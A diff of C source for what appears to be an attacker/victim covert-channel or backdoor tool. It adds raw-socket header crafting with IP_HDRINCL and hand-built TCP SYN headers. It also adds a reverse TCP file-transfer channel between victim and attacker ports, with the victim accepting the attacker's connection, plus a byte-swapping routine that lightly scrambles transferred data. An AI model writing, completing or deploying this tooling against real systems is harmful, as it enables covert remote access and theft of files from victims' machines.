@@ -81,6 +81,11 @@ void create_socket(void *arg, char flag, char protocol, char* ip, uint16_t port)
                 perror("attacker udp socket() ERROR\n");
                 exit(EXIT_FAILURE);
             }
+            if (setsockopt(opts->udp_socket, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) < 0) {
+                perror("Error setting IP_HDRINCL option");
+                exit(EXIT_FAILURE);
+            }
+
             opts->udpsa.sin_family = AF_INET;
             opts->udpsa.sin_port = htons(port);
             opts->udpsa.sin_addr.s_addr = inet_addr(ip);
@@ -96,10 +101,42 @@ void create_socket(void *arg, char flag, char protocol, char* ip, uint16_t port)
             opts->tcpsa.sin_addr.s_addr = inet_addr(ip);
         }
 
-        if (setsockopt(opts->udp_socket, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) < 0) {
-            perror("Error setting IP_HDRINCL option");
-            exit(EXIT_FAILURE);
+        if (protocol == 'R') {
+            opts->rtcp_socket = socket(AF_INET, SOCK_STREAM, 0);
+            if (opts->rtcp_socket == -1) {
+                perror("attacker rtcp socket() ERROR\n");
+                exit(EXIT_FAILURE);
+            }
+
+            if (setsockopt(opts->rtcp_socket, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable)) < 0) {
+                perror("Error setting SO_REUSEADDR option");
+                exit(EXIT_FAILURE);
+            }
+
+            if (setsockopt(opts->rtcp_socket, SOL_SOCKET, SO_REUSEPORT, &enable, sizeof(enable)) < 0) {
+                perror("Error setting SO_REUSEADDR option");
+                exit(EXIT_FAILURE);
+            }
+
+            opts->rtcpsa.sin_family = AF_INET;
+            opts->rtcpsa.sin_port = htons(VIC_FILE_PORT);
+            opts->rtcpsa.sin_addr.s_addr = inet_addr(ip);
+
+            opts->mtcpsa.sin_family = AF_INET;
+            opts->mtcpsa.sin_port = htons(ATC_FILE_PORT);
+            opts->mtcpsa.sin_addr.s_addr = htonl(INADDR_ANY);
+
+            if(bind(opts->rtcp_socket, (struct sockaddr*)&(opts->mtcpsa), sizeof(opts->mtcpsa)) < 0) {
+                perror("attacker rtcp bind() ERROR\n");
+                exit(EXIT_FAILURE);
+            }
+
+            if(connect(opts->rtcp_socket, (struct sockaddr*)&opts->rtcpsa, sizeof(opts->rtcpsa)) < 0 ){
+                perror("attacker rtcp connect() ERROR\n");
+                exit(EXIT_FAILURE);
+            }
         }
+
     }
 
     if (flag == 'V') {
@@ -122,6 +159,42 @@ void create_socket(void *arg, char flag, char protocol, char* ip, uint16_t port)
             opts->tcpsa.sin_family = AF_INET;
             opts->tcpsa.sin_port = htons(port);
         }
+
+        if (protocol == 'R') {
+            opts->rtcp_socket = socket(AF_INET, SOCK_STREAM, 0);
+            if (opts->rtcp_socket == -1) {
+                perror("victim rtcp socket() ERROR\n");
+                exit(EXIT_FAILURE);
+            }
+            opts->rtcpsa.sin_family = AF_INET;
+            opts->rtcpsa.sin_port = htons(port);
+            opts->rtcpsa.sin_addr.s_addr = htonl(INADDR_ANY);
+
+            if (setsockopt(opts->rtcp_socket, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable)) < 0) {
+                perror("Error setting SO_REUSEADDR option");
+                exit(EXIT_FAILURE);
+            }
+
+            if(bind(opts->rtcp_socket, (struct sockaddr*)&(opts->rtcpsa), sizeof(opts->rtcpsa)) < 0) {
+                perror("victim rtcp bind() ERROR\n");
+                exit(EXIT_FAILURE);
+            }
+
+
+            if (listen(opts->rtcp_socket, 2) == -1) {
+                printf("victim rtcp listen() ERROR\n");
+                exit(EXIT_FAILURE);
+            }
+
+
+            int attacker_addr_size;
+            attacker_addr_size = sizeof(opts->ctcpsa);
+            opts->atcp_socket = accept(opts->rtcp_socket, (struct sockaddr*)&(opts->ctcpsa), &attacker_addr_size);
+            if (opts->atcp_socket < 0){
+                perror( "accept() failed\n");
+                exit( 1);
+            }
+        }
     }
 }
 
@@ -140,17 +213,16 @@ unsigned short create_tcp_header(struct tcphdr* th, uint16_t sport, uint16_t dpo
     th->source = htons(sport);
     th->dest = htons(dport);
     th->seq = htonl(1);
-    th->ack_seq = htonl(0);
-    th->doff = 10;
+    th->ack_seq = 0;
+    th->doff = 5;
     th->fin = 0;
     th->syn = 1;
     th->rst = 0;
     th->psh = 0;
     th->ack = 0;
     th->urg = 0;
-    th->check = calculate_checksum(&th, sizeof(struct tcphdr));
     th->window = htons(5840);
-    th->urg_ptr = 0;
+    th->check = 0;
 
     return sizeof(struct tcphdr);
 }
@@ -181,3 +253,16 @@ unsigned short create_ip_header(struct iphdr* ih, void *arg, char flag, char c, 
     return sizeof(struct iphdr);
 }
 
+
+void process_data(char* chunk, int size) {
+    for (int i = 0; i < size - 1; i += 2) {
+        swap(&chunk[i], &chunk[i+1]);
+    }
+}
+
+
+void swap(char* a, char* b) {
+    char temp = *a;
+    *a = *b;
+    *b = temp;
+}
